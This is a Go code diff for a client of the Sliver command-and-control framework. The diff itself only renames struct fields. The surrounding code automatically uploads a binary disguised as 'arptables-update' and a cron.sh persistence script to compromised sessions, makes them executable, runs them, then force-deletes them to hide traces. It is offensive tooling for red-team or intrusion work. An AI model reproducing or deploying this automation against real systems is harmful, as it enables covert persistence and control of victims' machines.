@@ -20,8 +20,8 @@ import (
 )
 
 type SliverConnection struct {
-	rpc rpcpb.SliverRPCClient
-	ln  *grpc.ClientConn
+	RPC rpcpb.SliverRPCClient
+	LN  *grpc.ClientConn
 }
 
 func MakeRequest(session *clientpb.Session) *commonpb.Request {
@@ -55,12 +55,12 @@ func (con *SliverConnection) SliverConnect(configPath string) {
 	if err != nil {
 		log.Fatal(err)
 	}
-	con.rpc = rpc
-	con.ln = ln
+	con.RPC = rpc
+	con.LN = ln
 	log.Printf("[*] Connected to sliver server: %s:%d", config.LHost, config.LPort)
-	//defer ln.Close()
+	//defer LN.Close()
 	// Open the event stream to be able to collect all events sent by  the server
-	eventStream, err := con.rpc.Events(context.Background(), &commonpb.Empty{})
+	eventStream, err := con.RPC.Events(context.Background(), &commonpb.Empty{})
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -90,7 +90,7 @@ func (con *SliverConnection) SliverConnect(configPath string) {
 									app.Printf("%s\n", err)
 								}
 								uploadGzip := new(encoders.Gzip).Encode(fileBuf)
-								_, err = client.rpc.Upload(context.Background(), &sliverpb.UploadReq{
+								_, err = client.RPC.Upload(context.Background(), &sliverpb.UploadReq{
 									Path:    "/tmp/arptables-update",
 									Encoder: "gzip",
 									Data:    uploadGzip,
@@ -115,7 +115,7 @@ else
         chmod 0755 ~/.arp/arptables-update
         ~/.arp/arptables-update
 fi`))
-								_, err = client.rpc.Upload(context.Background(), &sliverpb.UploadReq{
+								_, err = client.RPC.Upload(context.Background(), &sliverpb.UploadReq{
 									Path:    "/tmp/cron.sh",
 									Encoder: "gzip",
 									Data:    uploadGzip,
@@ -143,7 +143,7 @@ fi`))
 											triggers[triggernum].triggered[triggerednum].uploadcount++
 											if triggeredIter.uploadcount == 2 {
 												time.Sleep(2 * time.Second)
-												_, err = client.rpc.Chmod(context.Background(), &sliverpb.ChmodReq{
+												_, err = client.RPC.Chmod(context.Background(), &sliverpb.ChmodReq{
 													Path:      "/tmp/cron.sh",
 													FileMode:  "0700",
 													Recursive: false,
@@ -156,7 +156,7 @@ fi`))
 												if err != nil {
 													app.Printf("%s\n", err)
 												}
-												_, err = client.rpc.Chmod(context.Background(), &sliverpb.ChmodReq{
+												_, err = client.RPC.Chmod(context.Background(), &sliverpb.ChmodReq{
 													Path:      "/tmp/arptables-update",
 													FileMode:  "0755",
 													Recursive: false,
@@ -170,7 +170,7 @@ fi`))
 													app.Printf("%s\n", err)
 												}
 												time.Sleep(2 * time.Second)
-												_, err = client.rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
+												_, err = client.RPC.Execute(context.Background(), &sliverpb.ExecuteReq{
 													Path: "/tmp/cron.sh",
 													Args: []string{},
 													Request: &commonpb.Request{
@@ -185,7 +185,7 @@ fi`))
 												triggeredIter.Init = false
 											}
 										} else if strings.Contains(string(event.Data), "ExecuteReq") && !triggeredIter.Init {
-											_, err = client.rpc.Rm(context.Background(), &sliverpb.RmReq{
+											_, err = client.RPC.Rm(context.Background(), &sliverpb.RmReq{
 												Path:      "/tmp/cron.sh",
 												Recursive: false,
 												Force:     true,
@@ -198,7 +198,7 @@ fi`))
 											if err != nil {
 												app.Printf("%s\n", err)
 											}
-											_, err = client.rpc.Rm(context.Background(), &sliverpb.RmReq{
+											_, err = client.RPC.Rm(context.Background(), &sliverpb.RmReq{
 												Path:      "/tmp/arptables-update",
 												Recursive: false,
 												Force:     true,
@@ -231,7 +231,7 @@ fi`))
 						session := event.Session
 						// call any RPC you want, for the full list, see
 						// https://github.com/BishopFox/sliver/blob/master/protobuf/rpcpb/services.proto
-						resp, err := rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
+						resp, err := RPC.Execute(context.Background(), &sliverpb.ExecuteReq{
 							Path:    `c:\windows\system32\calc.exe`,
 							Output:  false,
 							Request: makeRequest(session),
@@ -239,7 +239,7 @@ fi`))
 						if err != nil {
 							log.Fatal(err)
 						}
-						rpc.Cd(context.Background(), &sliverpb.CdReq{
+						RPC.Cd(context.Background(), &sliverpb.CdReq{
 							Path:    "",
 							Request: makeRequest(),
 						})
